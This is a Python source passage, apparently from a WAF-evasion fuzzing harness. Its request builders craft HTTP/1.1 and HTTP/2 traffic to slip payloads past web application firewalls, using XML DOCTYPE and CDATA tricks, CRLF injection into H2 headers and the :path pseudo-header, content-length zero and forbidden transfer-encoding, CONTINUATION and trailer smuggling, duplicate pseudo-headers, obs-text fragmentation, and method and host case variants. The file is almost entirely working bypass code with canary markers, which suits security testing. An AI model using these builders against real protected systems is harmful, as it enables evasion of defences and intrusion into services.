            "application/xhtml+xml",
        ])

    def _build_xml_doctype_close(
        self, *, payload: str, canary: str, request_id: str,
        base_headers: list[str],
    ) -> bytes:
        """WAFFLED DOCTYPE Closure Confusion: extra ``]>`` in DOCTYPE plus an
        inline ENTITY so WAFs that naively track ``<!DOCTYPE...]>`` close the
        DOCTYPE at the wrong position and skip inspection of downstream
        elements containing the payload.
        """
        extra_close = self.rng.choice(["]>", "]>]", "]><!--wf-->", "\n]>"])
        safe_payload = payload.replace("<", "&lt;").replace("&", "&amp;")
        body = (
            f"<?xml version=\"1.0\"?>\n"
            f"<!DOCTYPE req [\n"
            f"  <!ELEMENT req ANY>\n"
            f"  <!ENTITY wf \"{canary}\">\n"
            f"{extra_close}\n"
            f"<req><canary>{canary}</canary><data>{safe_payload}</data></req>"
        ).encode("utf-8", errors="replace")
        headers = [
            *base_headers,
            f"Content-Type: {self._xml_ct()}",
            f"Content-Length: {len(body)}",
        ]
        return _render_request("POST", f"/api/{request_id}", headers, body)

    def _build_xml_schema_manip(
        self, *, payload: str, canary: str, request_id: str,
        base_headers: list[str],
    ) -> bytes:
        """WAFFLED Schema Closure Manipulation: duplicate / malformed xmlns
        attributes on the root element. WAFs that validate or normalize
        schemas may reject / skip the body; backends with lenient parsers
        still consume the payload.
        """
        safe_payload = payload.replace("<", "&lt;").replace("&", "&amp;")
        xmlns_variant = self.rng.choice([
            'xmlns:a="urn:one" xmlns:a="urn:two"',
            'xmlns="http://first" xmlns="http://second"',
            'xmlns:x="" xmlns:x="urn:evil"',
            'xmlns:a="urn:a" xmlns:A="urn:b"',
        ])
        body = (
            f"<?xml version=\"1.0\"?>\n"
            f"<req {xmlns_variant}>\n"
            f"  <canary>{canary}</canary>\n"
            f"  <data>{safe_payload}</data>\n"
            f"</req>"
        ).encode("utf-8", errors="replace")
        headers = [
            *base_headers,
            f"Content-Type: {self._xml_ct()}",
            f"Content-Length: {len(body)}",
        ]
        return _render_request("POST", f"/api/{request_id}", headers, body)

    def _build_xml_extra_field(
        self, *, payload: str, canary: str, request_id: str,
        base_headers: list[str],
    ) -> bytes:
        """WAFFLED Extra Field Addition: payload goes in a secondary element
        while the primary / expected element holds a benign value. WAFs that
        only inspect the first / expected field miss the payload.
        """
        safe_payload = payload.replace("<", "&lt;").replace("&", "&amp;")
        # Variant: order of safe vs payload elements
        if self.rng.random() < 0.5:
            inner = (
                f"  <q>benign_value</q>\n"
                f"  <canary>{canary}</canary>\n"
                f"  <extra>{safe_payload}</extra>\n"
                f"  <notes>{safe_payload}</notes>\n"
            )
        else:
            inner = (
                f"  <canary>{canary}</canary>\n"
                f"  <primary>legitimate</primary>\n"
                f"  <appendix>{safe_payload}</appendix>\n"
            )
        body = (f"<?xml version=\"1.0\"?>\n<req>\n{inner}</req>").encode("utf-8", errors="replace")
        headers = [
            *base_headers,
            f"Content-Type: {self._xml_ct()}",
            f"Content-Length: {len(body)}",
        ]
        return _render_request("POST", f"/api/{request_id}", headers, body)

    def _build_xml_newline_abuse(
        self, *, payload: str, canary: str, request_id: str,
        base_headers: list[str],
    ) -> bytes:
        """WAFFLED Newline Abuse: non-standard whitespace (``\\x0b``, ``\\x0c``,
        CR) inside element content confuses WAF tokenizers while strict XML
        parsers still parse the text normally.
        """
        safe_payload = payload.replace("<", "&lt;").replace("&", "&amp;")
        noise = self.rng.choice(["\x0b", "\x0c", "\r", "\x0b\x0c", "\r\t"])
        body = (
            f"<?xml version=\"1.0\"?>\n"
            f"<req><canary>{canary}</canary>"
            f"<data>{noise}{safe_payload}{noise}</data></req>"
        ).encode("utf-8", errors="replace")
        headers = [
            *base_headers,
            f"Content-Type: {self._xml_ct()}",
            f"Content-Length: {len(body)}",
        ]
        return _render_request("POST", f"/api/{request_id}", headers, body)

    def _build_xml_misplaced(
        self, *, payload: str, canary: str, request_id: str,
        base_headers: list[str],
    ) -> bytes:
        """WAFFLED Misplaced Field: place the payload inside an attribute
        value instead of element text. WAFs that only inspect text content
        miss it; backends that read attributes still see it.
        """
        attr_safe = payload.replace("\"", "&quot;").replace("<", "&lt;").replace("&", "&amp;")
        body = (
            f"<?xml version=\"1.0\"?>\n"
            f"<req canary=\"{canary}\" data=\"{attr_safe}\">\n"
            f"  <status>ok</status>\n"
            f"</req>"
        ).encode("utf-8", errors="replace")
        headers = [
            *base_headers,
            f"Content-Type: {self._xml_ct()}",
            f"Content-Length: {len(body)}",
        ]
        return _render_request("POST", f"/api/{request_id}", headers, body)

    def _build_xml_cdata_hide(
        self, *, payload: str, canary: str, request_id: str,
        base_headers: list[str],
    ) -> bytes:
        """Hide the payload inside a ``<![CDATA[...]]>`` section. Many WAFs
        apply lighter inspection to CDATA (or strip it before inspection),
        while backends surface the raw bytes to application code.
        """
        # Ensure payload doesn't prematurely close the CDATA section.
        cdata_payload = payload.replace("]]>", "]]]]><![CDATA[>")
        body = (
            f"<?xml version=\"1.0\"?>\n"
            f"<req><canary>{canary}</canary>"
            f"<data><![CDATA[{cdata_payload}]]></data></req>"
        ).encode("utf-8", errors="replace")
        headers = [
            *base_headers,
            f"Content-Type: {self._xml_ct()}",
            f"Content-Length: {len(body)}",
        ]
        return _render_request("POST", f"/api/{request_id}", headers, body)

    # ── H2 downgrade families ────────────────────────────────────────

    def _build_h2_header_inject_crlf(
        self, *, payload: str, canary: str, request_id: str,
        base_headers: list[str],
    ) -> bytes:
        """CRLF injection inside an H2 header value.

        H2 frames don't use CRLF as a delimiter (binary framing), so the
        WAF processes the HEADERS frame normally.  A gateway that translates
        H2 → H1 may embed the raw header value into the H1 response header,
        introducing an extra header line that carries the payload past the
        WAF's inspection window.
        """
        body = f"canary={canary}&data={payload}".encode("utf-8", errors="replace")
        inject_value = f"safe\r\nX-Injected: {payload}\r\nX-Canary: {canary}"
        return build_h2_request(
            method="POST",
            path=f"/submit/{request_id}",
            authority="target.local",
            body=body,
            extra_headers=[
                ("x-wf-crlf-inject", inject_value),
                ("x-wf-request-id", request_id),
            ],
        )

    def _build_h2_cl_zero_body(
        self, *, payload: str, canary: str, request_id: str,
        base_headers: list[str],
    ) -> bytes:
        """H2.CL evasion: ``content-length: 0`` in the HEADERS frame with a
        non-empty DATA frame carrying the payload.

        WAFs that enforce Content-Length from the HEADERS frame skip body
        inspection entirely.  The backend reads the DATA frame regardless.
        """
        body = f"canary={canary}&data={payload}".encode("utf-8", errors="replace")
        pseudo = [
            (":method", "POST"),
            (":path", f"/submit/{request_id}"),
            (":authority", "target.local"),
            (":scheme", "http"),
        ]
        regular = [
            ("content-type", "application/x-www-form-urlencoded"),
            ("content-length", "0"),
            ("x-wf-request-id", request_id),
        ]
        return build_h2_request_raw_headers(pseudo, regular, body)

    def _build_h2_te_forbidden(
        self, *, payload: str, canary: str, request_id: str,
        base_headers: list[str],
    ) -> bytes:
        """Transfer-Encoding in H2 HEADERS — forbidden by RFC 7540 §8.1.2.2.

        Some gateways pass the TE header through when translating to H1.
        The backend then interprets the body as chunked, while the WAF
        inspected the H2 frame without applying chunked decoding.
        """
        raw_body = f"canary={canary}&data={payload}".encode("utf-8", errors="replace")
        chunk_size = format(len(raw_body), "x").encode()
        chunked_body = chunk_size + b"\r\n" + raw_body + b"\r\n0\r\n\r\n"
        pseudo = [
            (":method", "POST"),
            (":path", f"/submit/{request_id}"),
            (":authority", "target.local"),
            (":scheme", "http"),
        ]
        regular = [
            ("transfer-encoding", "chunked"),
            ("x-wf-request-id", request_id),
        ]
        return build_h2_request_raw_headers(pseudo, regular, chunked_body)

    def _build_h2_pseudo_path_inject(
        self, *, payload: str, canary: str, request_id: str,
        base_headers: list[str],
    ) -> bytes:
        """CRLF / whitespace injection into the H2 ``:path`` pseudo-header.

        H2 uses binary framing so any bytes are legal in the HEADERS frame.
        A gateway that naively copies ``:path`` into the H1 request line
        may produce a malformed H1 request whose extra lines carry the payload
        past the WAF's H2-level inspection.
        """
        body = f"q={canary}".encode("utf-8", errors="replace")
        injected_path = (
            f"/submit/{request_id}?q=safe HTTP/1.1\r\n"
            f"X-H2-Inject: {payload}\r\n"
            f"X-Canary: {canary}\r\n"
            f"Foo: bar"
        )
        pseudo = [
            (":method", "POST"),
            (":path", injected_path),
            (":authority", "target.local"),
            (":scheme", "http"),
        ]
        regular = [
            ("content-type", "application/x-www-form-urlencoded"),
            ("content-length", str(len(body))),
            ("x-wf-request-id", request_id),
        ]
        return build_h2_request_raw_headers(pseudo, regular, body)

    def _build_h2_authority_mismatch(
        self, *, payload: str, canary: str, request_id: str,
        base_headers: list[str],
    ) -> bytes:
        """H2 ``:authority`` vs ``host`` header mismatch.

        The WAF may route the request based on the ``host`` header while the
        backend uses ``:authority`` for origin context.  A mismatch shifts
        the effective context the backend operates in.
        """
        body = f"canary={canary}&payload={payload}".encode("utf-8", errors="replace")
        fake_authority = f"attacker-{request_id[:8]}.invalid"
        pseudo = [
            (":method", "POST"),
            (":path", f"/submit/{request_id}"),
            (":authority", fake_authority),
            (":scheme", "http"),
        ]
        regular = [
            ("host", "target.local"),
            ("content-type", "application/x-www-form-urlencoded"),
            ("content-length", str(len(body))),
            ("x-wf-request-id", request_id),
        ]
        return build_h2_request_raw_headers(pseudo, regular, body)

    def _build_h2_scheme_mismatch(
        self, *, payload: str, canary: str, request_id: str,
        base_headers: list[str],
    ) -> bytes:
        """Unexpected H2 ``:scheme`` pseudo-header value.

        RFC 7540 §8.1.2.3 requires ``:scheme`` to be ``http`` or ``https``.
        Unexpected values may confuse WAF routing decisions based on
        scheme-dependent security policies.
        """
        body = f"canary={canary}&data={payload}".encode("utf-8", errors="replace")
        schemes = ["https, http", "javascript", "ftp", "data", "file"]
        scheme_val = self.rng.choice(schemes)
        pseudo = [
            (":method", "POST"),
            (":path", f"/submit/{request_id}"),
            (":authority", "target.local"),
            (":scheme", scheme_val),
        ]
        regular = [
            ("content-type", "application/x-www-form-urlencoded"),
            ("content-length", str(len(body))),
            ("x-wf-request-id", request_id),
        ]
        return build_h2_request_raw_headers(pseudo, regular, body)

    def _build_h2_continuation_inject(
        self, *, payload: str, canary: str, request_id: str,
        base_headers: list[str],
    ) -> bytes:
        """Split H2 header block across HEADERS + CONTINUATION frames.

        RFC 9113 §6.10: A HEADERS frame without END_HEADERS MUST be followed by
        CONTINUATION frames.  Some WAF implementations inspect only the first
        HEADERS frame and miss headers that arrive in the CONTINUATION fragment.

        Technique: encode ``x-injection`` and ``x-wf-*`` headers in the
        CONTINUATION block; the main HEADERS frame carries only pseudo-headers
        and ``content-type`` (looks benign).  The evasion payload lives in the
        fragment that the WAF may skip.
        """
        import hpack
        from .h2_frames import (
            build_data_frame, build_settings_frame, build_window_update,
            _frame,
        )
        body = f"canary={canary}&data={payload}".encode("utf-8", errors="replace")

        enc = hpack.Encoder()
        # First block: pseudo-headers + content-type only (no END_HEADERS)
        first_headers = [
            (":method", "POST"),
            (":path", f"/api/{request_id}"),
            (":authority", "target.local"),
            (":scheme", "http"),
            ("content-type", "application/x-www-form-urlencoded"),
        ]
        first_block = enc.encode(first_headers)
        # HEADERS frame without END_HEADERS (flags=0x0 for POST with body)
        headers_frame = _frame(0x1, 0x0, 1, first_block)

        # Continuation block: the interesting headers (payload + markers)
        cont_headers = [
            ("content-length", str(len(body))),
            ("x-injection", payload),
            ("x-wf-request-id", request_id),
        ]
        cont_block = enc.encode(cont_headers)
        continuation_frame = build_continuation_frame(cont_block, stream_id=1, end_headers=True)

        parts: list[bytes] = [
            H2_CLIENT_PREFACE,
            build_settings_frame(),
            build_window_update(65535, stream_id=0),
            headers_frame,
            continuation_frame,
            build_data_frame(body, stream_id=1, end_stream=True),
        ]
        return b"".join(parts)

    def _build_h2_trailers_inject(
        self, *, payload: str, canary: str, request_id: str,
        base_headers: list[str],
    ) -> bytes:
        """Inject payload in H2 trailing HEADERS frame (trailers).

        RFC 9113 §8.1: A request MAY include a trailing HEADERS frame after
        the DATA frame with END_STREAM set on the HEADERS, not the DATA.
        WAFs that stop inspection after the body DATA frame miss trailers.

        Technique: send DATA without END_STREAM, then a HEADERS frame with
        END_STREAM|END_HEADERS containing the injection header.
        """
        from .h2_frames import (
            build_data_frame, build_headers_frame, build_settings_frame,
            build_window_update,
        )
        body = f"canary={canary}".encode("utf-8")

        main_frame = build_headers_frame(
            [
                (":method", "POST"),
                (":path", f"/api/{request_id}"),
                (":authority", "target.local"),
                (":scheme", "http"),
                ("content-type", "application/x-www-form-urlencoded"),
                ("content-length", str(len(body))),
                ("x-wf-request-id", request_id),
            ],
            stream_id=1,
            end_stream=False,   # body follows
            end_headers=True,
        )
        # DATA without END_STREAM so trailers can follow
        data_frame = build_data_frame(body, stream_id=1, end_stream=False)

        # Trailers HEADERS: END_STREAM(0x1) | END_HEADERS(0x4) = 0x5
        import hpack
        from .h2_frames import _frame
        enc = hpack.Encoder()
        trailer_block = enc.encode([
            ("x-injection", payload),
            ("x-custom-data", payload),
        ])
        trailer_frame = _frame(0x1, 0x5, 1, trailer_block)

        parts: list[bytes] = [
            H2_CLIENT_PREFACE,
            build_settings_frame(),
            build_window_update(65535, stream_id=0),
            main_frame,
            data_frame,
            trailer_frame,
        ]
        return b"".join(parts)

    def _build_h2_duplicate_pseudo(
        self, *, payload: str, canary: str, request_id: str,
        base_headers: list[str],
    ) -> bytes:
        """Duplicate pseudo-header with a mutated second copy.

        RFC 9113 §8.3.1: A request MUST NOT contain duplicate pseudo-header
        fields.  However, some WAF implementations inspect only the first
        occurrence; injecting a second ``:path`` or ``:method`` with a malicious
        value may bypass path-based or method-based ACL rules.

        Variants:
          - Duplicate ``:method`` (second = lowercase or non-standard)
          - Duplicate ``:path`` (second contains payload injection)
          - Duplicate ``:authority`` (second is an attacker domain)
        """
        import hpack
        from .h2_frames import (
            build_data_frame, build_settings_frame, build_window_update,
            _frame,
        )
        body = f"canary={canary}&data={payload}".encode("utf-8", errors="replace")

        variant = self.rng.choice(["method", "path", "authority"])
        if variant == "method":
            headers = [
                (":method", "POST"),
                (":method", "get"),     # duplicate — RFC violation
                (":path", f"/api/{request_id}"),
                (":authority", "target.local"),
                (":scheme", "http"),
                ("content-type", "application/x-www-form-urlencoded"),
                ("content-length", str(len(body))),
            ]
        elif variant == "path":
            headers = [
                (":method", "POST"),
                (":path", f"/api/{request_id}"),
                (":path", f"/{payload}"),  # duplicate with payload
                (":authority", "target.local"),
                (":scheme", "http"),
                ("content-type", "application/x-www-form-urlencoded"),
                ("content-length", str(len(body))),
            ]
        else:  # authority
            headers = [
                (":method", "POST"),
                (":path", f"/api/{request_id}"),
                (":authority", "target.local"),
                (":authority", "evil.attacker.invalid"),  # duplicate
                (":scheme", "http"),
                ("content-type", "application/x-www-form-urlencoded"),
                ("content-length", str(len(body))),
            ]

        enc = hpack.Encoder()
        block = enc.encode(headers)
        # END_HEADERS(0x4) only — no END_STREAM, body follows
        headers_frame = _frame(0x1, 0x4, 1, block)

        parts: list[bytes] = [
            H2_CLIENT_PREFACE,
            build_settings_frame(),
            build_window_update(65535, stream_id=0),
            headers_frame,
            build_data_frame(body, stream_id=1, end_stream=True),
        ]
        return b"".join(parts)

    def _build_h2_composed(
        self, *, payload: str, canary: str, request_id: str,
        base_headers: list[str],
    ) -> bytes:
        """Compositional H2 builder — combines 2-4 frame-level primitives.

        Mirrors ``_build_mp_composed``: sample compatible mutations from
        ``_H2_MUT_POOL``, set flags, then assemble a novel H2 frame sequence
        that exercises multiple evasion axes simultaneously.
        """
        import hpack
        from .h2_frames import (
            build_data_frame, build_settings_frame, build_window_update,
            _frame,
        )

        k = self.rng.randint(2, 4)
        muts = _pick_h2_muts(self.rng, k)

        # ── Default state ────────────────────────────────────────────
        do_cont_split = False
        n_continuations = 1
        do_trailer = False
        stream_id = 1
        do_padding = False
        pad_length = 0
        dup_pseudo: str | None = None
        scheme_val = "http"
        authority_val = "target.local"
        do_te = False
        do_cl_zero = False
        inject_path: str | None = None
        inject_header: str | None = None
        settings_dict: dict[int, int] | None = None
        do_window_zero = False

        # ── Apply selected primitives ────────────────────────────────
        for m in muts:
            if m == "cont_split":
                do_cont_split = True
                n_continuations = self.rng.randint(1, 3)
            elif m == "trailer_append":
                do_trailer = True
            elif m == "multi_stream":
                stream_id = self.rng.choice([3, 5, 7])
            elif m == "padding":
                do_padding = True
                pad_length = self.rng.randint(1, 64)
            elif m == "dup_method":
                dup_pseudo = "method"
            elif m == "dup_path":
                dup_pseudo = "path"
            elif m == "dup_authority":
                dup_pseudo = "authority"
            elif m == "scheme_exotic":
                scheme_val = self.rng.choice(
                    ["https, http", "javascript", "ftp", "data", "file"],
                )
            elif m == "authority_mismatch":
                authority_val = f"attacker-{request_id[:8]}.invalid"
            elif m == "te_forbidden":
                do_te = True
            elif m == "cl_zero":
                do_cl_zero = True
            elif m == "path_inject":
                inject_path = (
                    f"/submit/{request_id}?q=safe HTTP/1.1\r\n"
                    f"X-H2-Inject: {payload}"
                )
            elif m == "header_inject_crlf":
                inject_header = f"safe\r\nX-Injected: {payload}"
            elif m == "settings_abuse":
                settings_dict = {0x1: 0, 0x3: 0, 0x5: 16777215}
            elif m == "window_zero":
                do_window_zero = True

        # ── Build pseudo-headers ─────────────────────────────────────
        path = inject_path or f"/api/{request_id}"
        pseudo: list[tuple[str, str]] = [
            (":method", "POST"),
            (":path", path),
            (":authority", authority_val),
            (":scheme", scheme_val),
        ]
        if dup_pseudo == "method":
            pseudo.insert(1, (":method", "get"))
        elif dup_pseudo == "path":
            pseudo.append((":path", f"/{payload}"))
        elif dup_pseudo == "authority":
            pseudo.insert(3, (":authority", "evil.attacker.invalid"))

        # ── Build body & regular headers ─────────────────────────────
        body = f"canary={canary}&data={payload}".encode("utf-8", errors="replace")
        regular: list[tuple[str, str]] = [
            ("content-type", "application/x-www-form-urlencoded"),
            ("x-wf-request-id", request_id),
        ]
        if do_te:
            regular.append(("transfer-encoding", "chunked"))
        elif do_cl_zero:
            regular.append(("content-length", "0"))
        else:
            regular.append(("content-length", str(len(body))))
        if inject_header:
            regular.append(("x-wf-crlf-inject", inject_header))

        # ── HPACK encode ─────────────────────────────────────────────
        enc = hpack.Encoder()
        all_headers = pseudo + regular
        block = enc.encode(all_headers)

        has_body = bool(body)
        frame_seq: list[bytes] = []

        # ── HEADERS / CONTINUATION frames ────────────────────────────
        if do_cont_split and len(block) > 10:
            chunk_size = max(1, len(block) // (n_continuations + 1))
            chunks = [block[i:i + chunk_size]
                      for i in range(0, len(block), chunk_size)]
            end_stream_h = not has_body and not do_trailer
            flags_h = 0x00
            if end_stream_h:
                flags_h |= 0x01
            frame_seq.append(_frame(0x1, flags_h, stream_id, chunks[0]))
            for i, chunk in enumerate(chunks[1:]):
                is_last = (i == len(chunks) - 2)
                frame_seq.append(
                    build_continuation_frame(
                        chunk, stream_id=stream_id, end_headers=is_last,
                    ),
                )
        elif do_padding:
            frame_seq.append(
                build_padded_headers_frame(
                    block,
                    stream_id=stream_id,
                    pad_length=pad_length,
                    end_stream=(not has_body and not do_trailer),
                    end_headers=True,
                ),
            )
        else:
            end_stream_h = not has_body and not do_trailer
            flags_h = 0x04  # END_HEADERS
            if end_stream_h:
                flags_h |= 0x01
            frame_seq.append(_frame(0x1, flags_h, stream_id, block))

        # ── DATA frame ───────────────────────────────────────────────
        if has_body:
            raw_body = body
            if do_te:
                chunk_hex = format(len(body), "x").encode()
                raw_body = chunk_hex + b"\r\n" + body + b"\r\n0\r\n\r\n"
            data_end_stream = not do_trailer
            frame_seq.append(
                build_data_frame(raw_body, stream_id=stream_id,
                                 end_stream=data_end_stream),
            )

        # ── Trailer HEADERS ──────────────────────────────────────────
        if do_trailer:
            trailer_headers = [
                ("x-injection", payload),
                ("x-custom-data", payload),
            ]
            trailer_block = enc.encode(trailer_headers)
            # END_STREAM(0x1) | END_HEADERS(0x4) = 0x5
            frame_seq.append(_frame(0x1, 0x05, stream_id, trailer_block))

        # ── Assemble ─────────────────────────────────────────────────
        settings = (build_settings_frame(settings_dict) if settings_dict
                    else build_settings_frame())
        window = build_window_update(
            0 if do_window_zero else 65535, stream_id=0,
        )
        parts = [H2_CLIENT_PREFACE, settings, window, *frame_seq]
        return b"".join(parts)

    def _build_h2_grammar(
        self, *, payload: str, canary: str, request_id: str,
        base_headers: list[str],
    ) -> bytes:
        """Grammar-driven H2 frame sequence builder.

        Uses the ``h2_frame_sequence`` grammar to generate structured H2SEQ
        text, substitutes payload/canary placeholders, then translates to
        binary H2 wire format via ``H2GrammarTranslator``.

        Falls back to a minimal template when no grammar registry is available
        (e.g. direct-construction tests).
        """
        from .h2_grammar_translator import H2GrammarTranslator

        if self._grammar_generator is not None:
            text = self._grammar_generator.generate("h2_frame_sequence")
        else:
            # Fallback template when registry unavailable
            text = (
                "H2SEQ\n"
                f":method POST\n"
                f":path /api/{request_id}\n"
                ":authority target.local\n"
                ":scheme http\n"
                "content-type: application/x-www-form-urlencoded\n"
                f"x-injection: {payload}\n"
                "---BODY---\n"
                f"canary={canary}&data=test\n"
            )

        # Substitute grammar-generated placeholders with actual values
        text = text.replace("WF-CANARY-h2gram001", canary)
        text = text.replace("WF-PAYLOAD-SLOT", payload)
        text = text.replace("/submit/grammar", f"/submit/{request_id}")

        return H2GrammarTranslator().translate(text)

    # ── rfc_spec_quirks builders ──────────────────────────────────────

    def _build_rfc_vt_ff_separator(
        self, *, payload: str, canary: str, request_id: str,
        base_headers: list[str],
    ) -> bytes:
        """RFC 9112 §5: VT(%x0B) or FF(%x0C) as OWS around the colon separator.

        RFC says recipients MAY treat VT/FF/bare-CR as SP.  WAFs that parse
        only SP/HTAB as OWS will see a malformed header name (with VT attached)
        while lenient backends normalise VT/FF to SP, exposing the payload.
        """
        sep = self.rng.choice(["\x0b", "\x0c", "\x0b\x0c"])
        body = f"c={canary}".encode("latin-1", errors="replace")
        headers = [
            *base_headers,
            "Content-Type: application/x-www-form-urlencoded",
            f"Content-Length: {len(body)}",
            # VT/FF placed immediately after the colon (OWS position)
            f"X-Custom-Input:{sep}{payload}",
        ]
        return _render_request("POST", f"/api/{request_id}", headers, body)

    def _build_rfc_absolute_target(
        self, *, payload: str, canary: str, request_id: str,
        base_headers: list[str],
    ) -> bytes:
        """RFC 9112 §6.3: absolute-form request-target with mismatched Host.

        When the request-target is absolute-form, RFC 9112 requires the origin
        server to ignore the Host header and use the URI authority instead.
        A WAF that inspects only the Host header for domain-based rules while
        the backend honours the absolute-form URI may apply different policies.
        """
        body = f"q={payload}&c={canary}".encode("latin-1", errors="replace")
        # absolute-form path — _render_request inserts this directly into request-line
        path = f"http://target.local/api/{request_id}"
        # Replace Host with mismatch, preserve User-Agent / Accept / X-WF-*
        headers = [
            "Host: mismatch.attacker.invalid" if h.startswith("Host:") else h
            for h in base_headers
        ] + [
            "Content-Type: application/x-www-form-urlencoded",
            f"Content-Length: {len(body)}",
        ]
        return _render_request("POST", path, headers, body)

    def _build_rfc_trailer_inject(
        self, *, payload: str, canary: str, request_id: str,
        base_headers: list[str],
    ) -> bytes:
        """RFC 9112 §6.5.1: payload injected into chunked trailing headers.

        Distinct from enc_chunked_hide (which hides payload in chunk *extension*).
        Trailers appear *after* the final ``0\\r\\n`` chunk.  WAFs that only
        inspect the initial headers miss trailer fields; some backends process
        declared Trailer headers and merge them into the request context.
        No Content-Length is included to avoid CL.TE framing conflicts.
        """
        safe_body = f"c={canary}".encode("ascii")
        chunk_hex = f"{len(safe_body):X}"
        raw_body = (
            f"{chunk_hex}\r\n".encode() + safe_body + b"\r\n"
            + b"0\r\n"
            + f"X-Custom-Input: {payload}\r\n".encode("latin-1", errors="replace")
            + b"\r\n"
        )
        headers = [
            *base_headers,
            "Transfer-Encoding: chunked",
            "Trailer: X-Custom-Input",
            # No Content-Length — pure chunked, avoids CL.TE ambiguity
        ]
        return _render_request("POST", f"/api/{request_id}", headers, raw_body)

    def _build_rfc_param_continuation(
        self, *, payload: str, canary: str, request_id: str,
        base_headers: list[str],
    ) -> bytes:
        """RFC 2231 §3: parameter continuation syntax for multipart boundary.

        ``boundary*0="----WF"; boundary*1="Boundary"`` is reassembled to
        ``----WFBoundary`` by RFC-2231-aware parsers.  WAFs that read only the
        first parameter segment fail to locate the boundary and skip body
        inspection; the backend reassembles and processes the MIME parts.
        (WAFFLED 2025: 351 distinct multipart bypasses via this mechanism.)
        """
        b0 = "----WF"
        b1 = "Boundary"
        full_boundary = b0 + b1
        body = (
            f"--{full_boundary}\r\n"
            f'Content-Disposition: form-data; name="data"\r\n\r\n'
            f"{payload}\r\n"
            f"--{full_boundary}\r\n"
            f'Content-Disposition: form-data; name="c"\r\n\r\n'
            f"{canary}\r\n"
            f"--{full_boundary}--\r\n"
        ).encode("latin-1", errors="replace")
        headers = [
            *base_headers,
            f'Content-Type: multipart/form-data; boundary*0="{b0}"; boundary*1="{b1}"',
            f"Content-Length: {len(body)}",
        ]
        return _render_request("POST", f"/upload/{request_id}", headers, body)

    def _build_rfc_obs_text_header(
        self, *, payload: str, canary: str, request_id: str,
        base_headers: list[str],
    ) -> bytes:
        """RFC 9110 §5.5: obs-text bytes (%x80-FF) interspersed in header value.

        RFC 9110 permits obs-text (0x80-0xFF) inside field-values for backward
        compatibility.  Injecting obs-text bytes between payload keyword characters
        breaks WAF regex/signature matches (pattern no longer appears contiguous)
        while backends that normalise or strip high bytes restore the plain payload.
        """
        obs_byte = self.rng.choice(["\x80", "\x9f", "\xc0", "\xfe"])
        # Insert obs-text every 3 characters to fragment WAF patterns
        broken: list[str] = []
        for i, ch in enumerate(payload):
            broken.append(ch)
            if i % 3 == 2 and i < len(payload) - 1:
                broken.append(obs_byte)
        broken_payload = "".join(broken)
        body = f"c={canary}".encode("latin-1", errors="replace")
        headers = [
            *base_headers,
            "Content-Type: application/x-www-form-urlencoded",
            f"Content-Length: {len(body)}",
            f"X-Custom-Input: {broken_payload}",
        ]
        return _render_request("POST", f"/api/{request_id}", headers, body)

    def _build_rfc_method_case(
        self, *, payload: str, canary: str, request_id: str,
        base_headers: list[str],
    ) -> bytes:
        """RFC 9110 §9: HTTP method tokens are case-sensitive (uppercase standard).

        WAFs typically apply signatures only to canonical uppercase methods.
        Lenient backends (Spring, Tomcat in certain configs) normalise mixed-case
        methods, so the request is processed while WAF rules don't match.
        """
        method_variants = ["gEt", "pOsT", "GeT", "PoSt", "get", "post"]
        method = self.rng.choice(method_variants)
        body = f"q={payload}&c={canary}".encode("latin-1", errors="replace")
        headers = [
            *base_headers,
            "Content-Type: application/x-www-form-urlencoded",
            f"Content-Length: {len(body)}",
        ]
        return _render_request(method, f"/api/{request_id}", headers, body)

    def _build_rfc_host_case(
        self, *, payload: str, canary: str, request_id: str,
        base_headers: list[str],
    ) -> bytes:
        """RFC 3986 §6.2.2.1: host component is case-insensitive.

        WAF rules that use exact-match or case-sensitive patterns on the Host
        header value may fail to recognise ``TARGET.LOCAL`` as ``target.local``.
        Backends normalise the host before routing, so the request reaches the
        backend while the WAF's host-based rule set is not triggered.
        Distinct from hdr_case_tricks (which varies header *name* casing).
        """
        host_variants = ["TARGET.LOCAL", "Target.Local", "tArGeT.lOcAl", "TARGET.local"]
        mixed_host = self.rng.choice(host_variants)
        body = f"q={payload}&c={canary}".encode("latin-1", errors="replace")
        # Replace Host value in base_headers, keep User-Agent / Accept / X-WF-*
        headers = [
            f"Host: {mixed_host}" if h.startswith("Host:") else h
            for h in base_headers
        ] + [
            "Content-Type: application/x-www-form-urlencoded",
            f"Content-Length: {len(body)}",
        ]
        return _render_request("POST", f"/api/{request_id}", headers, body)
